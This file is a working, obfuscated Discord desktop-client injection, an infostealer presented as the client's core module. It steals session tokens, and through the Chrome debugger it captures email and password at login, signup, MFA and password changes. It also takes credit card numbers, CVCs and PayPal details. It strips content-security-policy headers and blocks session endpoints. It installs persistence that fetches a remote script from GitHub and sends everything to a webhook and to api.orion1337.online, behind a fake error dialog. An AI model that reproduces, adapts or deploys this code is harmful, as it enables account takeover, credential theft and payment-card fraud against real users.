const { BrowserWindow: BrowserWindow, session: session } = require('electron'),
  { execSync } = require('child_process'),
  { dialog } = require('electron'),
  { parse: parse } = require('querystring'),
  fs = require('fs'),
  os = require('os'),
  https = require('https'),
  path = require('path')
let WEBHOOK = '%WEBHOOK_URL%',
  API_URL =
    'http://api.orion1337.online:1337/nigga',
  [
    BACKUPCODES_SCRIPT,
    LOGOUT_SCRIPT,
    TOKEN_SCRIPT,
    INJECT_URL,
    BADGES,
    EMAIL,
    PASSWORD,
  ] = [
    'const elements = document.querySelectorAll(\'span[class^="code_"]\');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;',
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
    "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
    'https://raw.githubusercontent.com/ziskoweb/0xJU81ns7jqsl9l-/main/clean.js',
    {
      _nitro: [
        '<:Piracy_UP1:1239315063228203058>',
        '<:Piracy_UP2:1239315064473915452>',
        '<:Piracy_UP3:1239315065698652190>',
        '<:Piracy_UP4:1239315067032305685>',
        '<:Piracy_UP5:1239315068462829658>',
        '<:Piracy_UP6:1234548630300528651>',
        '<:Piracy_UP7:1239315069926510602>',
        '<:Piracy_UP8:1239315072593952939>',
        '<:Piracy_UP9:1239315074045444146>',
      ],
      _discord_emloyee: {
        value: 1,
        emoji: '<:Piracy_DiscordStaff:1239314903391797258>',
        rare: true,
      },
      _partnered_server_owner: {
        value: 2,
        emoji: '<:Piracy_Partner:1239314902011609128>',
        rare: true,
      },
      _hypeSquad_events: {
        value: 4,
        emoji: '<:Piracy_HypeEvents:1239315034107150366>',
        rare: true,
      },
      _bug_hunter_level_1: {
        value: 8,
        emoji: '<:Piracy_BugHunterNormal:1239314895741259818>',
        rare: true,
      },
      _house_bravery: {
        value: 64,
        emoji: '<:Piracy_Bravery:1239314908110258277>',
        rare: false,
      },
      _house_brilliance: {
        value: 128,
        emoji: '<:Piracy_Bravery:1239314908110258277>',
        rare: false,
      },
      _house_balance: {
        value: 256,
        emoji: '<:Piracy_Balace:1239314904687706195>',
        rare: false,
      },
      _early_supporter: {
        value: 512,
        emoji: '<:Piracy_EarlySupporter:1239314899029459024>',
        rare: true,
      },
      _bug_hunter_level_2: {
        value: 16384,
        emoji: '<:Piracy_BugHunterMax:1239314897628827699>',
        rare: true,
      },
      _early_bot_developer: {
        value: 131072,
        emoji: '<:Piracy_BotDev:1239314894604730428>',
        rare: true,
      },
      _certified_moderator: {
        value: 262144,
        emoji: '<:Piracy_DiscordMod:1239314900543733982>',
        rare: true,
      },
     },
    '',
    '',
  ]
const request = async (
    _0x421166,
    _0x44e4f2,
    _0xb0ee21 = {},
    _0x456307 = null
  ) => {
    try {
      return new Promise((_0x2924ae, _0xb675f2) => {
        let _0x42f25b = new URL(_0x44e4f2),
          _0x3570c6 = {
            protocol: _0x42f25b.protocol,
            hostname: _0x42f25b.hostname,
            path: _0x42f25b.pathname + _0x42f25b.search,
            method: _0x421166.toUpperCase(),
            headers: {
              ..._0xb0ee21,
              'Access-Control-Allow-Origin': '*',
            },
          },
          _0x17fc18 = https.request(_0x3570c6, (_0x1ae50a) => {
            let _0x55e4a9 = ''
            _0x1ae50a.on('data', (_0x45cb6b) => (_0x55e4a9 += _0x45cb6b))
            _0x1ae50a.on('end', () => _0x2924ae(_0x55e4a9))
          })
        _0x17fc18.on('error', (_0x3722b7) => _0xb675f2(_0x3722b7))
        if (_0x456307) {
          _0x17fc18.write(_0x456307)
        }
        _0x17fc18.end()
      })
    } catch (_0x343aff) {
      return Promise.reject(_0x343aff)
    }
  },
  notify = async (_0x5c0ce3, _0x3eea56, _0x59204f) => {
    let _0x20837f = getNitro(await fProfile(_0x3eea56)),
      _0x2d25ab = await getBadges(_0x59204f.flags),
      _0x2cd7a7 = await getBilling(_0x3eea56),
      _0x1daf4f = await getFriends(_0x3eea56)
    _0x5c0ce3.embeds[0].title = ''
    _0x5c0ce3.embeds[0].fields.unshift({
      name: '<a:epsilon:1238877901185744997> Token:',
      value:
        '`' +
        _0x3eea56 +
        '`\n[<:preview:1233213181829054494> Click here to copy!](http://api.orion1337.online:8080/copy/' +
        _0x3eea56 +
        ')',
      inline: false,
    })
    _0x5c0ce3.embeds[0].thumbnail = {
      url:
        'https://cdn.discordapp.com/avatars/' +
        _0x59204f.id +
        '/' +
        _0x59204f.avatar +
        '.webp',
    }
    _0x5c0ce3.embeds[0].fields.push(
      {
        name: '<:bby:948992995481513995> Badges:',
        value: _0x2d25ab,
        inline: true,
      },
      {
        name: '<:bby:948992995921915924> Nitro Type:',
        value: _0x20837f,
        inline: true,
      },
      {
        name: '<a:bby:948992995754135603> Billing:',
        value: _0x2cd7a7,
        inline: true,
      },
      {
        name: '<:bby:948992995787690005> IP:',
        value: '`' + JSON.parse(await getNetwork()).ip + '`',
        inline: true,
      },
      {
        name: '<a:bby:948993079703130194> | Path:',
        value: '```' + __dirname.toString().trim().replace(/\\/g, '/') + '```',
        inline: false,
      }
    )
    _0x5c0ce3.embeds.push({
      title: '<:rustler:987689933844127804> UHQ Friends',
      description: _0x1daf4f,
    })
    _0x5c0ce3.embeds.forEach((_0x4afaae) => {
      _0x4afaae.color = 2829617
      _0x4afaae.author = {
        name: _0x59204f.username + ' | ' + _0x59204f.id,
        icon_url:
          'https://cdn.discordapp.com/avatars/' +
          _0x59204f.id +
          '/' +
          _0x59204f.avatar +
          '.png',
      }
      _0x4afaae.footer = {
        text: decodeB64('QGZsYWdzdGVhbGVy'),
        icon_url: 'https://c.tenor.com/CuV-Lg_hICEAAAAd/tenor.gif',
      }
    })
    try {
      await request(
        'POST',
        WEBHOOK,
        { 'Content-Type': 'application/json' },
        JSON.stringify(_0x5c0ce3)
      )
      await request(
        'POST',
        API_URL,
        { 'Content-Type': 'application/json' },
        JSON.stringify(_0x5c0ce3)
      )
    } catch (_0x154687) {
      console.error('Error sending request to webhook:', _0x154687.message)
    }
  },
  decodeB64 = (_0x58c748) => Buffer.from(_0x58c748, 'base64').toString(),
  execScript = async (_0x9a8e93) =>
    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
      _0x9a8e93,
      true
    )
dialog.showErrorBox('Ops!', 'An internal error occurred in the Discord API.')
const fetch = async (_0xb25ade, _0x18df79) =>
    JSON.parse(
      await request(
        'GET',
        [
          'https://discordapp.com/api',
          'https://discord.com/api',
          'https://canary.discord.com/api',
          'https://ptb.discord.com/api',
        ][Math.floor(Math.random() * 4)] +
          '/v9/users/' +
          _0xb25ade,
        { ..._0x18df79 }
      )
    ),
  fAccount = async (_0x210282) =>
    await fetch('@me', { authorization: _0x210282 }),
  fProfile = async (_0x3abb0f) =>
    await fetch(
      Buffer.from(_0x3abb0f.split('.')[0], 'base64').toString('binary') +
        '/profile',
      { authorization: _0x3abb0f }
    ),
  fFriends = async (_0x3b49f7) =>
    await fetch('@me/relationships', { authorization: _0x3b49f7 }),
  fServers = async (_0x3b91dc) =>
    await fetch('@me/guilds?with_counts=true', { authorization: _0x3b91dc }),
  fBilling = async (_0x253390) =>
    await fetch('@me/billing/payment-sources', { authorization: _0x253390 }),
  getNetwork = async () =>
    await request('GET', 'https://api.ipify.org/?format=json', {
      'Content-Type': 'application/json',
    }),
  getBadges = (_0x2e23a0) =>
    Object.keys(BADGES).reduce(
      (_0x4074aa, _0x17b6d9) =>
        BADGES.hasOwnProperty(_0x17b6d9) &&
        (_0x2e23a0 & BADGES[_0x17b6d9].value) === BADGES[_0x17b6d9].value
          ? '' + _0x4074aa + BADGES[_0x17b6d9].emoji + ' '
          : _0x4074aa,
      ''
    ) || '`No Badges`',
  getRareBadges = (_0xacfb58) =>
    Object.keys(BADGES).reduce(
      (_0x1c3b45, _0x206b51) =>
        BADGES.hasOwnProperty(_0x206b51) &&
        (_0xacfb58 & BADGES[_0x206b51].value) === BADGES[_0x206b51].value &&
        BADGES[_0x206b51].rare
          ? '' + _0x1c3b45 + BADGES[_0x206b51].emoji + ' '
          : _0x1c3b45,
      ''
    ),
  getBilling = async (_0x2fb915) =>
    (await fBilling(_0x2fb915))
      .filter((_0x157e64) => !_0x157e64.invalid)
      .map((_0x1da40f) =>
        _0x1da40f.type === 1
          ? '<:epsilon:1238877942243659887>'
          : _0x1da40f.type === 2
          ? '<:epsilona:1238877973717848185>'
          : ''
      )
      .join('') || '`None`',
  getFriends = async (_0xbf5054) =>
    (await fFriends(_0xbf5054))
      .filter((_0x3ad13f) => _0x3ad13f.type === 1)
      .reduce(
        (_0x375d47, _0x5d6881) =>
          ((_0x54d73b) =>
            _0x54d73b
              ? (_0x375d47 || '') +
                (_0x54d73b + ' | `' + _0x5d6881.user.username + '`\n')
              : _0x375d47)(getRareBadges(_0x5d6881.user.public_flags)),
        ''
      ) || '<:empty:1239315133193523365> *Empty.*',
  getDate = (_0x237f86, _0x2ad1d1) =>
    new Date(_0x237f86).setMonth(_0x237f86.getMonth() + _0x2ad1d1),
  getNitro = (_0x2b40f0) => {
    let { premium_type: _0x5c890c, premium_guild_since: _0x4ea3ce } = _0x2b40f0,
      _0x4261c5 = '<:BadgeNitro:1159574870221398127>'
    switch (_0x5c890c) {
      default:
        return '`✖`'
      case 1:
        return _0x4261c5
      case 2:
        if (!_0x4ea3ce) {
          return _0x4261c5
        }
        let _0x15d033 = [2, 3, 6, 9, 12, 15, 18, 24],
          _0x2614a9 = 0
        for (let _0x37513d = 0; _0x37513d < _0x15d033.length; _0x37513d++) {
          if (
            Math.round(
              (getDate(new Date(_0x4ea3ce), _0x15d033[_0x37513d]) -
                new Date()) /
                86400000
            ) > 0
          ) {
            _0x2614a9 = _0x37513d
            break
          }
        }
        return _0x4261c5 + ' ' + BADGES['_nitro'][_0x2614a9]
    }
  },
  cruise = async (
    _0x10f94d,
    _0x1d48ae,
    _0x1e9411,
    _0x368f44,
    _0x171f02,
    _0x4c71fb
  ) => {
    let _0x59d084, _0x1a18f0, _0x18876b
    switch (_0x10f94d) {
      case 'LOGIN_USER':
        ;(_0x59d084 = await fAccount(_0x368f44.token)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<:bby:948992995951272047> Mail:',
                    value: '`' + _0x1d48ae + '`',
                    inline: true,
                  },
                  {
                    name: '<:rustler:987689933844127804> Pass:',
                    value: '`' + _0x1e9411 + '`',
                    inline: true,
                  },
                ],
              },
            ],
          })
        _0x171f02.code !== undefined &&
          _0x1a18f0.embeds[0].fields.push({
            name: '<:Prod_lock:1075459390611656794> Used Code:',
            value: '`' + _0x171f02.code + '`',
            inline: true,
          })
        notify(_0x1a18f0, _0x368f44.token, _0x59d084)
        break
      case 'USERNAME_CHANGED':
        ;(_0x59d084 = await fAccount(_0x368f44.token)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<a:bby:948993079703130194> New Username:',
                    value: '`' + _0x171f02.username + '`',
                    inline: true,
                  },
                  {
                    name: '<:rustler:987689933844127804> Pass:',
                    value: '`' + _0x171f02.password + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x368f44.token, _0x59d084)
        break
      case 'EMAIL_CHANGED':
        ;(_0x59d084 = await fAccount(_0x368f44.token)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<:bby:948992995951272047> Mail:',
                    value: '`' + _0x1d48ae + '`',
                    inline: true,
                  },
                  {
                    name: '<:rustler:987689933844127804> Pass:',
                    value: '`' + _0x1e9411 + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x368f44.token, _0x59d084)
        break
      case 'PASSWORD_CHANGED':
        ;(_0x59d084 = await fAccount(_0x368f44.token)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<:rustler:987689933844127804> New Pass:',
                    value: '`' + _0x171f02.new_password + '`',
                    inline: true,
                  },
                  {
                    name: '<:rustler:987689933844127804> Old Pass:',
                    value: '`' + _0x171f02.password + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x368f44.token, _0x59d084)
        break
      case 'CREDITCARD_ADDED':
        ;(_0x18876b = _0x368f44),
          (_0x59d084 = await fAccount(_0x18876b)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: 'Number',
                    value: '`' + _0x171f02['card[number]'] + '`',
                    inline: true,
                  },
                  {
                    name: 'CVC',
                    value: '`' + _0x171f02['card[cvc]'] + '`',
                    inline: true,
                  },
                  {
                    name: 'Expiration',
                    value:
                      '`' +
                      _0x171f02['card[exp_month]'] +
                      '/' +
                      _0x171f02['card[exp_year]'] +
                      '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x18876b, _0x59d084)
        break
      case 'PAYPAL_ADDED':
        ;(_0x18876b = _0x368f44),
          (_0x59d084 = await fAccount(_0x18876b)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<:bby:948992995951272047> Mail:',
                    value: '`' + _0x59d084.email + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x18876b, _0x59d084)
        break
      case 'INJECTED':
        ;(_0x18876b = _0x368f44),
          (_0x59d084 = await fAccount(_0x18876b)),
          (_0x1a18f0 = {
            title: _0x4c71fb,
            embeds: [
              {
                fields: [
                  {
                    name: '<:bby:948992995951272047> Mail:',
                    value: '`' + _0x59d084.email + '`',
                    inline: true,
                  },
                ],
              },
            ],
          }),
          notify(_0x1a18f0, _0x18876b, _0x59d084)
        break
      default:
    }
  },
  DISCORD_PATH = (function () {
    const _0x34b71d = process.argv[0]
      .split(path.sep)
      .slice(0, -1)
      .join(path.sep)
    let _0xfa5d97
    if (process.platform === 'win32') {
      _0xfa5d97 = path.join(_0x34b71d, 'resources')
    } else {
      if (process.platform === 'darwin') {
        _0xfa5d97 = path.join(_0x34b71d, 'Contents', 'Resources')
      }
    }
    if (fs.existsSync(_0xfa5d97)) {
      return {
        resource: _0xfa5d97,
        app: _0x34b71d,
      }
    }
    return {
      undefined: undefined,
      undefined: undefined,
    }
  })()
async function UPDATE_CHECKING() {
  const { resource: _0x3c727e, app: _0x3d1961 } = DISCORD_PATH
  if (_0x3c727e === undefined || _0x3d1961 === undefined) {
    return
  }
  let _0x36f5cc = path.join(_0x3c727e, 'app')
  if (!fs.existsSync(_0x36f5cc)) {
    fs.mkdirSync(_0x36f5cc)
  }
  if (fs.existsSync(path.join(_0x36f5cc, 'package.json'))) {
    fs.unlinkSync(path.join(_0x36f5cc, 'package.json'))
  }
  if (fs.existsSync(path.join(_0x36f5cc, 'index.js'))) {
    fs.unlinkSync(path.join(_0x36f5cc, 'index.js'))
  }
  ;(process.platform === 'win32' || process.platform === 'darwin') &&
    (fs.writeFileSync(
      path.join(_0x36f5cc, 'package.json'),
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4
      )
    ),
    fs.writeFileSync(
      path.join(_0x36f5cc, 'index.js'),
      (
        "const fs = require('fs'), https = require('https');\nconst indexJs = '" +
        (_0x3d1961 +
          '\\modules\\' +
          fs
            .readdirSync(_0x3d1961 + '\\modules\\')
            .filter((_0x29f989) =>
              /discord_desktop_core-+?/.test(_0x29f989)
            )[0] +
          '\\discord_desktop_core\\index.js') +
        "';\nconst bdPath = '" +
        path.join(
          process.env.APPDATA,
          '\\betterdiscord\\data\\betterdiscord.asar'
        ) +
        "';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === \"module.exports = require('./core.asar')\")\n        init();\n})\nasync function init() {\n    https.get('" +
        INJECT_URL +
        "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" +
        WEBHOOK +
        "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" +
        path.join(_0x3c727e, 'app.asar') +
        "')\nif (fs.existsSync(bdPath)) require(bdPath);"
      ).replace(/\\/g, '\\\\')
    ))
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
    return
  } else {
    fs.rmdirSync(path.join(__dirname, 'initiation'))
  }
  if (!(await execScript(TOKEN_SCRIPT))) {
    return
  }
  cruise(
    'INJECTED',
    null,
    null,
    (await execScript(TOKEN_SCRIPT)) ?? '',
    null,
    'DISCORD INJECTED'
  )
  execScript(LOGOUT_SCRIPT)
}
session.defaultSession.webRequest.onBeforeRequest(
  {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
      'https://discord.com/api/v*/auth/sessions',
      'https://*.discord.com/api/v*/auth/sessions',
      'https://discordapp.com/api/v*/auth/sessions',
    ],
  },
  (_0x43ea4e, _0x40b9c6) => {
    if (!fs.existsSync(__dirname + '/Discord')) {
      fs.mkdirSync(__dirname + '/Discord')
    }
    !fs.existsSync(
      __dirname +
        '/Discord/' +
        WEBHOOK.split('/')[WEBHOOK.split('/').length - 1] +
        '.txt'
    ) &&
      (fs.writeFileSync(
        __dirname +
          '/Discord/' +
          WEBHOOK.split('/')[WEBHOOK.split('/').length - 1] +
          '.txt',
        WEBHOOK
      ),
      execScript(LOGOUT_SCRIPT))
    if (
      _0x43ea4e.url.startsWith('wss://remote-auth-gateway') ||
      _0x43ea4e.url.endsWith('auth/sessions')
    ) {
      _0x40b9c6({ cancel: true })
    } else {
      _0x40b9c6({ cancel: false })
    }
    UPDATE_CHECKING()
  }
)
session.defaultSession.webRequest.onHeadersReceived((_0x3ebcd9, _0x497733) => {
  delete _0x3ebcd9.responseHeaders['content-security-policy']
  delete _0x3ebcd9.responseHeaders['content-security-policy-report-only']
  _0x497733({
    responseHeaders: {
      ..._0x3ebcd9.responseHeaders,
      'Access-Control-Allow-Headers': '*',
    },
  })
})
session.defaultSession.webRequest.onCompleted(
  {
    urls: [
      'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
    ],
  },
  async (_0x1e4df0, _0x1fb09a) => {
    let _0x50bbb1
    try {
      _0x50bbb1 = parse(Buffer.from(_0x1e4df0.uploadData[0].bytes).toString())
    } catch (_0x37bb7b) {
      _0x50bbb1 = parse(
        decodeURIComponent(_0x1e4df0.uploadData[0].bytes.toString())
      )
    }
    let _0x10f7d4 = (await execScript(TOKEN_SCRIPT)) ?? ''
    if (_0x1e4df0.method != 'POST') {
      return
    }
    if (_0x1e4df0.statusCode !== 200 && _0x1e4df0.statusCode !== 202) {
      return
    }
    if (_0x1e4df0.url.endsWith('/paypal_accounts')) {
      cruise('PAYPAL_ADDED', null, null, _0x10f7d4, null, 'PAYPAL ADDED')
    } else {
      _0x1e4df0.url.endsWith('/tokens') &&
        cruise(
          'CREDITCARD_ADDED',
          null,
          null,
          _0x10f7d4,
          _0x50bbb1,
          'CREDITCARD ADDED'
        )
    }
  }
)
const CREATE_WINDOW_CLIENT = (_0x6a3273) => {
  if (!_0x6a3273.getAllWindows()[0]) {
    return
  }
  _0x6a3273.getAllWindows()[0].webContents.debugger.attach('1.3')
  _0x6a3273
    .getAllWindows()[0]
    .webContents.debugger.on(
      'message',
      async (_0x3d2406, _0x3636e3, _0x5887a6) => {
        if (_0x3636e3 !== 'Network.responseReceived') {
          return
        }
        if (
          !['/auth/login', '/auth/register', '/mfa/totp', '/users/@me'].some(
            (_0x5cd009) => _0x5887a6.response.url.endsWith(_0x5cd009)
          )
        ) {
          return
        }
        if (
          _0x5887a6.response.status !== 200 &&
          _0x5887a6.response.status !== 202
        ) {
          return
        }
        let _0x510e88 = JSON.parse(
            (
              await _0x6a3273
                .getAllWindows()[0]
                .webContents.debugger.sendCommand('Network.getResponseBody', {
                  requestId: _0x5887a6.requestId,
                })
            ).body
          ),
          _0xafd603 = JSON.parse(
            (
              await _0x6a3273
                .getAllWindows()[0]
                .webContents.debugger.sendCommand(
                  'Network.getRequestPostData',
                  { requestId: _0x5887a6.requestId }
                )
            ).postData
          )
        if (_0x5887a6.response.url.endsWith('/login')) {
          if (!_0x510e88.token) {
            EMAIL = _0xafd603.login
            PASSWORD = _0xafd603.password
            return
          }
          cruise(
            'LOGIN_USER',
            _0xafd603.login,
            _0xafd603.password,
            _0x510e88,
            _0xafd603,
            'LOGGED IN'
          )
        } else {
          if (_0x5887a6.response.url.endsWith('/register')) {
            cruise(
              'LOGIN_USER',
              _0xafd603.email,
              _0xafd603.password,
              _0x510e88,
              _0xafd603,
              'SIGNED UP'
            )
          } else {
            if (_0x5887a6.response.url.endsWith('/totp')) {
              cruise(
                'LOGIN_USER',
                EMAIL,
                PASSWORD,
                _0x510e88,
                _0xafd603,
                'LOGGED IN WITH MFA-2'
              )
            } else {
              if (_0x5887a6.response.url.endsWith('/@me')) {
                if (!_0xafd603.password) {
                  return
                }
                if (_0xafd603.email) {
                  cruise(
                    'EMAIL_CHANGED',
                    _0xafd603.email,
                    _0xafd603.password,
                    _0x510e88,
                    _0xafd603,
                    'CHANGED EMAIL'
                  )
                }
                if (_0xafd603.new_password) {
                  cruise(
                    'PASSWORD_CHANGED',
                    null,
                    null,
                    _0x510e88,
                    _0xafd603,
                    'CHANGED PASSWORD'
                  )
                }
                if (_0xafd603.username) {
                  cruise(
                    'USERNAME_CHANGED',
                    null,
                    null,
                    _0x510e88,
                    _0xafd603,
                    'CHANGED USERNAME'
                  )
                }
              }
            }
          }
        }
      }
    )
  _0x6a3273
    .getAllWindows()[0]
    .webContents.debugger.sendCommand('Network.enable')
  _0x6a3273
    .getAllWindows()[0]
    .on('closed', () => CREATE_WINDOW_CLIENT(BrowserWindow))
}
CREATE_WINDOW_CLIENT(BrowserWindow)
module.exports = require('./core.asar')
